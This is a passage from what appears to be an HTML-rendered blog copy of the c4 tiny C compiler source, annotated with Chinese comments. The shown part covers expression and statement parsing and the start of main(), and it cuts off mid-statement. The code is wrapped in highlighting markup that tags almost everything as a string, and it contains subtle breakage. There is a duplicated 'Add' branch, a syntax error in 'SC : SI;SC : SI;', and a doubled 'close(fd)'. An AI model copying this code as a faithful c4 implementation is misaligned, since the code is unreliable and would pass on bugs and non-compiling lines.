(semantic analyzer)，dereference semantic analyze 的過程為 ty=ty-PTR</span></span><br><span class="line"><span class="string">    next(); expr(Inc);//高優先權</span></span><br><span class="line"><span class="string">    if (ty &gt; INT) ty = ty - PTR; else &#123; printf(&quot;</span>%d: bad dereference\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = (ty == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &#125;// 8、解析取址操作</span></span><br><span class="line"><span class="string">  else if (tk == And) &#123;//address-of 的部分直接把 LI/LC command 砍掉，register 所存的就會是位址；相較於 derefernece 而言，register 存的是真正的值。//&amp;,取位址操作</span></span><br><span class="line"><span class="string">    next(); expr(Inc);</span></span><br><span class="line"><span class="string">    if (*e == LC || *e == LI) --e; else &#123; printf(&quot;</span>%d: bad address-of\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    ty = ty + PTR;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 9、解析運算符號表達式</span></span><br><span class="line"><span class="string">//expr() 回傳的值會存在 register，因此這邊要產生的 IR 要先把結果 Push 回 stack，然後再設定 register value，最後做運算，結果會 restore into register。</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;!&#x27;) &#123; next(); expr(Inc); *++e = PSH; *++e = IMM; *++e = 0; *++e = EQ; ty = INT; &#125;//!x相當於x==0</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;~&#x27;) &#123; next(); expr(Inc); *++e = PSH; *++e = IMM; *++e = -1; *++e = XOR; ty = INT; &#125;//~x 相當於x ^ -1</span></span><br><span class="line"><span class="string">  else if (tk == Add) &#123; next(); expr(Inc); ty = INT; &#125;</span></span><br><span class="line"><span class="string">  //處理 expr 開頭是 +/- 的 case。</span></span><br><span class="line"><span class="string">	else if (tk == Add) &#123; next(); expr(Inc); ty = INT; &#125;</span></span><br><span class="line"><span class="string">  else if (tk == Sub) &#123;</span></span><br><span class="line"><span class="string">    next(); *++e = IMM;//數值,取負</span></span><br><span class="line"><span class="string">    if (tk == Num) &#123; *++e = -ival; next(); &#125;</span></span><br><span class="line"><span class="string"> else &#123; *++e = -1; *++e = PSH; expr(Inc); *++e = MUL; &#125;//乘-1</span></span><br><span class="line"><span class="string">    ty = INT;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 10、解析自增、自減</span></span><br><span class="line"><span class="string">//pre-increment/pre-decrement：透過插入 Push command 將 register 的值存入 stack 中。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//expr() 第一部分處理的都是 expression 開頭的部分，接著第二部分將會展示如何使用 operator-precedence 處理 operator 優先權。</span></span><br><span class="line"><span class="string">  else if (tk == Inc || tk == Dec) &#123;//處理++x,--x//x--,x++在後面處理</span></span><br><span class="line"><span class="string">    t = tk; next(); expr(Inc);</span></span><br><span class="line"><span class="string">//處理++x,--x</span></span><br><span class="line"><span class="string">    if (*e == LC) &#123; *e = PSH; *++e = LC; &#125;//位址壓棧(下面SC/SI用到),再取數</span></span><br><span class="line"><span class="string">    else if (*e == LI) &#123; *e = PSH; *++e = LI; &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>%d: bad lvalue in pre-increment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = PSH;//將數值壓棧</span></span><br><span class="line"><span class="string">    *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);//指標則加減一字,否則加減1</span></span><br><span class="line"><span class="string">    *++e = (t == Inc) ? ADD : SUB;//運算</span></span><br><span class="line"><span class="string">    *++e = (ty == CHAR) ? SC : SI;//存回變數</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123; printf(&quot;</span>%d: bad expression\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">//使用 switch，但是 c4 並不支援 switch，因此才會採用多個 if-else。</span></span><br><span class="line"><span class="string">//Operator precedence (parsing)，主要處理四則運算。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//爬山法</span></span><br><span class="line"><span class="string">  //tk為ASCII碼的都不會超過Num=128</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  while (tk &gt;= lev) &#123; // &quot;</span>precedence climbing<span class="string">&quot; or &quot;</span>Top Down Operator Precedence<span class="string">&quot; method</span></span><br><span class="line"><span class="string">    t = ty;//ty在遞迴過程中可能會改變,所以備份目前處理的表達式類型</span></span><br><span class="line"><span class="string">// 11、解析賦值運算</span></span><br><span class="line"><span class="string">//將暫存器的位址 push 到 stack 中，做完後面的運算後，結果通常都會在暫存器中，因此透過 SC/SI 將暫存器的值存到 stack 中的位址。</span></span><br><span class="line"><span class="string">    if (tk == Assign) &#123;//賦值</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (*e == LC || *e == LI) *e = PSH;//左邊被tk=Id中變數部分處理過了,將位址壓棧</span></span><br><span class="line"><span class="string">			 else &#123; printf(&quot;</span>%d: bad lvalue in assignment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      expr(Assign); *++e = ((ty = t) == CHAR) ? SC : SI;SC : SI;//取得右值expr的值,作為a=expr的結果</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//處理類似 x=y?a:b 判斷式，保留 BZ 指令後面要填位址的空間</span></span><br><span class="line"><span class="string">//然後進行 recursive descent parser for expression，然後塞入 JMP 指令</span></span><br><span class="line"><span class="string">//且一樣保留後面要填位址的空間，展開最後的 expression 後，再填入要 JMP 的位址。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 12、解析三目運算符</span></span><br><span class="line"><span class="string">    else if (tk == Cond) &#123;//x?a:b和if類似,除了不能沒有else</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      *++e = BZ; d = ++e;</span></span><br><span class="line"><span class="string">      expr(Assign);</span></span><br><span class="line"><span class="string">      if (tk == &#x27;:&#x27;) next(); else &#123; printf(&quot;</span>%d: conditional missing colon\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *d = (int)(e + 3); *++e = JMP; d = ++e;</span></span><br><span class="line"><span class="string">      expr(Cond);</span></span><br><span class="line"><span class="string">      *d = (int)(e + 1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//通常牽扯到 Branch/Jump 指令的都會使用類似這種方法：先保留目標位址，等待後面的指令都確定後，才會知道目標位址。</span></span><br><span class="line"><span class="string">    else if (tk == Lor) &#123; next(); *++e = BNZ; d = ++e; expr(Lan); *d = (int)(e + 1); ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Lan) &#123; next(); *++e = BZ;  d = ++e; expr(Or);  *d = (int)(e + 1); ty = INT; &#125;</span></span><br><span class="line"><span class="string"> /*</span></span><br><span class="line"><span class="string">這邊運算子的概念就是先將數值 push into stack frame，然後利用 operator-precedence</span></span><br><span class="line"><span class="string">展開後面的 expression，展開的結果通常會存在 register，</span></span><br><span class="line"><span class="string">運算相關的 command 通常是拿 register 和 stack 做運算，然後將結果存回 register。</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">		else if (tk == Or)  &#123; next(); *++e = PSH; expr(Xor); *++e = OR;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Xor) &#123; next(); *++e = PSH; expr(And); *++e = XOR; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == And) &#123; next(); *++e = PSH; expr(Eq);  *++e = AND; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Eq)  &#123; next(); *++e = PSH; expr(Lt);  *++e = EQ;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Ne)  &#123; next(); *++e = PSH; expr(Lt);  *++e = NE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Lt)  &#123; next(); *++e = PSH; expr(Shl); *++e = LT;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Gt)  &#123; next(); *++e = PSH; expr(Shl); *++e = GT;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Le)  &#123; next(); *++e = PSH; expr(Shl); *++e = LE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Ge)  &#123; next(); *++e = PSH; expr(Shl); *++e = GE;  ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Shl) &#123; next(); *++e = PSH; expr(Add); *++e = SHL; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Shr) &#123; next(); *++e = PSH; expr(Add); *++e = SHR; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    //這邊同時處理 pointer 的加法：因為一次 add 一個「單位」。</span></span><br><span class="line"><span class="string">		//int *a;</span></span><br><span class="line"><span class="string">		//c=a+b;</span></span><br><span class="line"><span class="string">		else if (tk == Add) &#123;</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Mul);</span></span><br><span class="line"><span class="string">      if ((ty = t) &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL;  &#125;//處理指針</span></span><br><span class="line"><span class="string">      *++e = ADD;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//發現多了一個 if 判斷式，這是在處理指標相減計算中間的個數。</span></span><br><span class="line"><span class="string">    else if (tk == Sub) &#123;</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Mul);</span></span><br><span class="line"><span class="string">      if (t &gt; PTR &amp;&amp; t == ty) &#123; *++e = SUB; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = DIV; ty = INT; &#125;//指標相減</span></span><br><span class="line"><span class="string">      else if ((ty = t) &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL; *++e = SUB; &#125;//指標減數值</span></span><br><span class="line"><span class="string">      else *++e = SUB;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Mul) &#123; next(); *++e = PSH; expr(Inc); *++e = MUL; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Div) &#123; next(); *++e = PSH; expr(Inc); *++e = DIV; ty = INT; &#125;</span></span><br><span class="line"><span class="string">    else if (tk == Mod) &#123; next(); *++e = PSH; expr(Inc); *++e = MOD; ty = INT; &#125;</span></span><br><span class="line"><span class="string">//post-increment 的做法就是先改變 variable 在 stack 中的值，然後再回復成原來的值，並且存在 register 中，最後再進行運算。</span></span><br><span class="line"><span class="string">    else if (tk == Inc || tk == Dec) &#123;</span></span><br><span class="line"><span class="string">      if (*e == LC) &#123; *e = PSH; *++e = LC; &#125;</span></span><br><span class="line"><span class="string">      else if (*e == LI) &#123; *e = PSH; *++e = LI; &#125;</span></span><br><span class="line"><span class="string">      else &#123; printf(&quot;</span>%d: bad lvalue in post-increment\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = PSH; *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);</span></span><br><span class="line"><span class="string">      *++e = (tk == Inc) ? ADD : SUB;//先自增/自減</span></span><br><span class="line"><span class="string">      *++e = (ty == CHAR) ? SC : SI;//存到記憶體裡</span></span><br><span class="line"><span class="string">      *++e = PSH; *++e = IMM; *++e = (ty &gt; PTR) ? sizeof(int) : sizeof(char);</span></span><br><span class="line"><span class="string">      *++e = (tk == Inc) ? SUB : ADD;//再反轉操作，保證後自增/自減不影響這次表達式的求值 //PS:我終於知道哪些a=1;b=a+++a++為啥等於3了</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//這部分是處理 array index 的取值到 register 中，中間必須處理一個 array 單位乘以 index，以計算最終位址。</span></span><br><span class="line"><span class="string">    else if (tk == Brak) &#123;// 備份下標</span></span><br><span class="line"><span class="string">      next(); *++e = PSH; expr(Assign);//儲存備份配額,計算下標</span></span><br><span class="line"><span class="string">      if (tk == &#x27;]&#x27;) next(); else &#123; printf(&quot;</span>%d: close bracket expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      if (t &gt; PTR) &#123; *++e = PSH; *++e = IMM; *++e = sizeof(int); *++e = MUL;  &#125;//t==PTR時是Char,Char = 0</span></span><br><span class="line"><span class="string">      else if (t &lt; PTR) &#123; printf(&quot;</span>%d: pointer type expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">      *++e = ADD;</span></span><br><span class="line"><span class="string">      *++e = ((ty = t - PTR) == CHAR) ? LC : LI;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>%d: compiler error tk=%d\n<span class="string">&quot;, line, tk); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//處理 “if-else”, “while”, “return”, “&#123;&#125;”, “;”</span></span><br><span class="line"><span class="string">//語句分析</span></span><br><span class="line"><span class="string">void stmt()</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  int *a, *b;</span></span><br><span class="line"><span class="string">//*a:代表條件為false時跳到的語句</span></span><br><span class="line"><span class="string">  //*b:為了防止順序執行if-else程式碼,所以執行了true部分時應跳過false部分</span></span><br><span class="line"><span class="string">// 1、解析if語句</span></span><br><span class="line"><span class="string">  if (tk == If) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) </span></span><br><span class="line"><span class="string">		next(); </span></span><br><span class="line"><span class="string">		else &#123; printf(&quot;</span>%d: open paren expected\n<span class="string">&quot;, line); </span></span><br><span class="line"><span class="string">		exit(-1); &#125;</span></span><br><span class="line"><span class="string">    expr(Assign);</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) </span></span><br><span class="line"><span class="string">		next(); </span></span><br><span class="line"><span class="string">		else &#123; </span></span><br><span class="line"><span class="string">		printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = BZ;//branch if zero</span></span><br><span class="line"><span class="string">		 b = ++e;//branch address pointer</span></span><br><span class="line"><span class="string">    stmt();// 繼續分析</span></span><br><span class="line"><span class="string">    if (tk == Else) &#123;</span></span><br><span class="line"><span class="string">      *b = (int)(e + 3); // e + 3 位置是else 起始位置</span></span><br><span class="line"><span class="string">			*++e = JMP; </span></span><br><span class="line"><span class="string">			b = ++e; // if 語句 else 之前插入 JMP 跳過Else 部分 // JMP目標</span></span><br><span class="line"><span class="string">			</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      stmt();//分析else 部分</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *b = (int)(e + 1);//if 語句結束,無論是if BZ 跳轉目標或是 else 之前的JMP的跳轉目標</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 2、解析while語句</span></span><br><span class="line"><span class="string">  else if (tk == While) &#123;//循環</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    a = e + 1;// While 迴圈體起始位址</span></span><br><span class="line"><span class="string">    if (tk == &#x27;(&#x27;) next(); else &#123; printf(&quot;</span>%d: open paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    expr(Assign);</span></span><br><span class="line"><span class="string">    if (tk == &#x27;)&#x27;) next(); else &#123; printf(&quot;</span>%d: close paren expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">    *++e = BZ;</span></span><br><span class="line"><span class="string">		 b = ++e;//b = While 語句結束後位址</span></span><br><span class="line"><span class="string">    stmt();//處理While 語句體</span></span><br><span class="line"><span class="string">    *++e = JMP; *++e = (int)a;//無條件跳到While語句開始(包含循環條件的程式碼),實作循環</span></span><br><span class="line"><span class="string">    *b = (int)(e + 1);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 3.解析return語句</span></span><br><span class="line"><span class="string">  else if (tk == Return) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    if (tk != &#x27;;&#x27;) expr(Assign);// 3.解析return語句</span></span><br><span class="line"><span class="string">    *++e = LEV;// 銷毀函式呼叫棧</span></span><br><span class="line"><span class="string">    if (tk == &#x27;;&#x27;) next(); else &#123; printf(&quot;</span>%d: semicolon expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">//解析複合語句</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;&#123;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">    while (tk != &#x27;&#125;&#x27;) stmt();//複合語句</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">// 5、解析單句</span></span><br><span class="line"><span class="string">  else if (tk == &#x27;;&#x27;) &#123;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else &#123;</span></span><br><span class="line"><span class="string">    expr(Assign);;//一般的語句認為是賦值語句/表達式</span></span><br><span class="line"><span class="string">    if (tk == &#x27;;&#x27;) next(); else &#123; printf(&quot;</span>%d: semicolon expected\n<span class="string">&quot;, line); exit(-1); &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	//fd file descriptor 檔案描述</span></span><br><span class="line"><span class="string">  //bt basetype</span></span><br><span class="line"><span class="string">  //poolsz 一系列池的大小</span></span><br><span class="line"><span class="string">  //ty type 記錄目前標識的類型</span></span><br><span class="line"><span class="string">  int fd, bt, ty, poolsz, *idmain;</span></span><br><span class="line"><span class="string">  int *pc, *sp, *bp, a, cycle; // vm registers 虛擬器的暫存器</span></span><br><span class="line"><span class="string">  int i, *t; // temps</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  --argc; ++argv;</span></span><br><span class="line"><span class="string">  if (argc &gt; 0 &amp;&amp; **argv == &#x27;-&#x27; &amp;&amp; (*argv)[1] == &#x27;s&#x27;) &#123; src = 1; --argc; ++argv; &#125;</span></span><br><span class="line"><span class="string">  if (argc &gt; 0 &amp;&amp; **argv == &#x27;-&#x27; &amp;&amp; (*argv)[1] == &#x27;d&#x27;) &#123; debug = 1; --argc; ++argv; &#125;</span></span><br><span class="line"><span class="string">  if (argc &lt; 1) &#123; printf(&quot;</span>usage: c4 [-s] [-d] file ...\n<span class="string">&quot;); return -1; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if ((fd = open(*argv, 0)) &lt; 0) &#123; printf(&quot;</span>could not open(%s)\n<span class="string">&quot;, *argv); return -1; &#125;</span></span><br><span class="line"><span class="string">//Symbol Table and Stack Frame 的大小都是 256KB。//開啟原始檔並讀取到src_pos中</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sym：symbol table.</span></span><br><span class="line"><span class="string">e：Assembly Code(IR) output.</span></span><br><span class="line"><span class="string">le：last print IR.</span></span><br><span class="line"><span class="string">sp：Stack Frame.</span></span><br><span class="line"><span class="string">data：data section.</span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">//poolsz = 256*1024; // 大小</span></span><br><span class="line"><span class="string">  //給各區域申請空間</span></span><br><span class="line"><span class="string">  poolsz = 256*1024; // arbitrary size</span></span><br><span class="line"><span class="string">  if (!(sym = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) symbol area\n<span class="string">&quot;, poolsz); return -1; &#125;//符號表</span></span><br><span class="line"><span class="string">  if (!(le = e = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) text area\n<span class="string">&quot;, poolsz); return -1; &#125;//文字段</span></span><br><span class="line"><span class="string">  if (!(data = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) data area\n<span class="string">&quot;, poolsz); return -1; &#125;//資料段</span></span><br><span class="line"><span class="string">  if (!(sp = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) <span class="built_in">stack</span> area\n<span class="string">&quot;, poolsz); return -1; &#125;//棧</span></span><br><span class="line"><span class="string">// 起始位置</span></span><br><span class="line"><span class="string">  memset(sym,  0, poolsz);</span></span><br><span class="line"><span class="string">  memset(e,    0, poolsz);</span></span><br><span class="line"><span class="string">  memset(data, 0, poolsz);</span></span><br><span class="line"><span class="string">//根據 enum 從 Char 到 While 一一加入 symbol table 中。</span></span><br><span class="line"><span class="string">//在 next() function 中 id 將會指到 sym =&gt; id = sym; // unwind symbol table locals.</span></span><br><span class="line"><span class="string">// 用詞法分析器先把這些關鍵字放進符號表</span></span><br><span class="line"><span class="string">  p = &quot;</span><span class="type">char</span> <span class="keyword">else</span> <span class="keyword">enum</span> <span class="keyword">if</span> <span class="type">int</span> <span class="keyword">return</span> <span class="keyword">sizeof</span> <span class="keyword">while</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">      &quot;</span>open read close <span class="built_in">printf</span> <span class="built_in">malloc</span> <span class="built_in">free</span> <span class="built_in">memset</span> <span class="built_in">memcmp</span> <span class="built_in">exit</span> <span class="type">void</span> main<span class="string">&quot;;</span></span><br><span class="line"><span class="string">// 預先把關鍵字加進去,id[Tk]修改為和Enum一致</span></span><br><span class="line"><span class="string">  i = Char; while (i &lt;= While) &#123; next(); id[Tk] = i++; &#125; // add keywords to symbol table 從 next() 新增 id(symbol) 之後，會再重新設定 token enum value。</span></span><br><span class="line"><span class="string">//預先把[庫]裡定義的符號(系統函數等) 加進去 Class 賦值為Sys</span></span><br><span class="line"><span class="string">//接下來處理 system call library，從 next() 新增 id(symbol) 之後，會再設定 token class, type, and value。</span></span><br><span class="line"><span class="string">  i = OPEN; while (i &lt;= EXIT) &#123; next(); id[Class] = Sys; id[Type] = INT; id[Val] = i++; &#125; // add library to symbol table</span></span><br><span class="line"><span class="string">// void 認為是char，不支援void類型，將void轉為char</span></span><br><span class="line"><span class="string">  //處理 void and main keyword，另外使用 idmain 紀錄 main `在 symbol table 的位置。</span></span><br><span class="line"><span class="string">	next(); id[Tk] = Char; // handle void type</span></span><br><span class="line"><span class="string">// 記錄main函數的符號id</span></span><br><span class="line"><span class="string">  next(); idmain = id; //指向main函數對應的符號表條目</span></span><br><span class="line"><span class="string">//讀取 source code 到 p(lp=p) 所指的位址，並且關閉 FD。</span></span><br><span class="line"><span class="string">  if (!(lp = p = malloc(poolsz))) &#123; printf(&quot;</span>could not <span class="built_in">malloc</span>(%d) source area\n<span class="string">&quot;, poolsz); return -1; &#125;</span></span><br><span class="line"><span class="string">  if ((i = read(fd, p, poolsz-1)) &lt;= 0) &#123; printf(&quot;</span>read() returned %d\n<span class="string">&quot;, i); return -1; &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	p[i] = 0;//字串結尾置0</span></span><br><span class="line"><span class="string">  close(fd);//釋放資源</span></span><br><span class="line"><span class="string">  p[i] = 0;</span></span><br><span class="line"><span class="string">  close(fd);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // parse declarations</span></span><br><span class="line"><span class="string">//在 main() 中，以上面這個 while loop 來 parsing tokens，直到 tk=‘\0’。</span></span><br><span class="line"><span class="string">// 語法分析</span></span><br><span class="line"><span class="string">  line = 1;</span></span><br><span class="line"><span class="string">  next();</span></span><br><span class="line"><span class="string">  while (tk) &#123;</span></span><br><span class="line"><span class="string">//前面兩個 if 分別處理 INT and CHAR，最後一個 if 處理 enum：使用 local variable i 來處理 value of enum id。</span></span><br><span class="line"><span class="string">    bt = INT; // basetype</span></span><br><span class="line"><span class="string">    if (tk == Int) next();//已經有bt == INT</span></span><br><span class="line"><span class="string">    else if (tk == Char) &#123; next(); bt = CHAR; &#125;//char 變數;</span></span><br><span class="line"><span class="string">    else if (tk == Enum) &#123;</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      if (tk != &#x27;&#123;&#x27;) next();// 似乎忽略了枚舉名,例如 enum xxx&#123;&#125;，去除多餘的空格</span></span><br><span class="line"><span class="string">      if (tk == &#x27;&#123;&#x27;) &#123;</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        i = 0;//Enum 預設從0 開始</span></span><br><span class="line"><span class="string">        while (tk != &#x27;&#125;&#x27;) &#123;//enum賦值有兩種方式,一種預設從0開始,還有一種可以自己進行賦值</span></span><br><span class="line"><span class="string">				//情況1</span></span><br><span class="line"><span class="string">          if (tk != Id) &#123; printf(&quot;</span>%d: bad <span class="keyword">enum</span> identifier %d\n<span class="string">&quot;, line, tk); return -1; &#125;//不是Identifier 就出錯</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          if (tk == Assign) &#123;// 發現賦值語句 如 enum &#123; Num = 128 &#125;;</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">            if (tk != Num) &#123; printf(&quot;</span>%d: bad <span class="keyword">enum</span> initializer\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">            i = ival;</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">//將目前的標識加入符號表中</span></span><br><span class="line"><span class="string">          id[Class] = Num; id[Type] = INT; id[Val] = i++;</span></span><br><span class="line"><span class="string">          if (tk == &#x27;,&#x27;) next();//還沒結束,跳過逗號</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//解析函數宣告或變數定義</span></span><br><span class="line"><span class="string">//處理 Global variables and Functions。</span></span><br><span class="line"><span class="string">    while (tk != &#x27;;&#x27; &amp;&amp; tk != &#x27;&#125;&#x27;) &#123;</span></span><br><span class="line"><span class="string">      ty = bt;</span></span><br><span class="line"><span class="string">// tk == Mul 表示已*開頭,為指針類型,型別加PTR表示何種類型的指針</span></span><br><span class="line"><span class="string">      while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;</span></span><br><span class="line"><span class="string">//check 是否有重複宣告，是屬於 semantic analyzer 的一部份。</span></span><br><span class="line"><span class="string">      if (tk != Id) &#123; printf(&quot;</span>%d: bad global declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">      if (id[Class]) &#123; printf(&quot;</span>%d: duplicate global definition\n<span class="string">&quot;, line); return -1; &#125;//重複全域變數定義,解釋見後</span></span><br><span class="line"><span class="string">      next();</span></span><br><span class="line"><span class="string">      id[Type] = ty;//賦值型別</span></span><br><span class="line"><span class="string">//這邊開始處理 Function declaration。</span></span><br><span class="line"><span class="string">      if (tk == &#x27;(&#x27;) &#123; // 函數</span></span><br><span class="line"><span class="string">//Symbol table 的 class 設定為 Fun 類型，然後將 value 設定為 IR command 的 下個指令(Function 第一個指令)的位址。</span></span><br><span class="line"><span class="string">        id[Class] = Fun;//型別為函數型</span></span><br><span class="line"><span class="string">        id[Val] = (int)(e + 1);//函數指標? 在字節碼中的偏移量/位址</span></span><br><span class="line"><span class="string">        next(); i = 0;</span></span><br><span class="line"><span class="string">/*</span></span><br><span class="line"><span class="string">這邊會檢查是否重複宣告 parameter。</span></span><br><span class="line"><span class="string">然後將 Symbol table 的資訊 (Class, type, Val) 備份到 HClass, HType, HVal，</span></span><br><span class="line"><span class="string">這邊是實作在 function 內部更改 local variable’s value 將不會影響到 Function 以外的 scope，parameter 也算是 Function local variables。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*/</span></span><br><span class="line"><span class="string">        while (tk != &#x27;)&#x27;) &#123;//參數列表</span></span><br><span class="line"><span class="string">          ty = INT;</span></span><br><span class="line"><span class="string">          if (tk == Int) next();</span></span><br><span class="line"><span class="string">          else if (tk == Char) &#123; next(); ty = CHAR; &#125;</span></span><br><span class="line"><span class="string">          while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//</span></span><br><span class="line"><span class="string">          if (tk != Id) &#123; printf(&quot;</span>%d: bad parameter declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">					if (id[Class] == Loc) &#123; printf(&quot;</span>%d: duplicate parameter definition\n<span class="string">&quot;, line); return -1; &#125;//函數參數是局部變量</span></span><br><span class="line"><span class="string">          id[HClass] = id[Class]; id[Class] = Loc;</span></span><br><span class="line"><span class="string">          id[HType]  = id[Type];  id[Type] = ty;</span></span><br><span class="line"><span class="string">          id[HVal]   = id[Val];   id[Val] = i++;//局部變數編號</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">          if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">//為局部變數的入棧申請空間</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        if (tk != 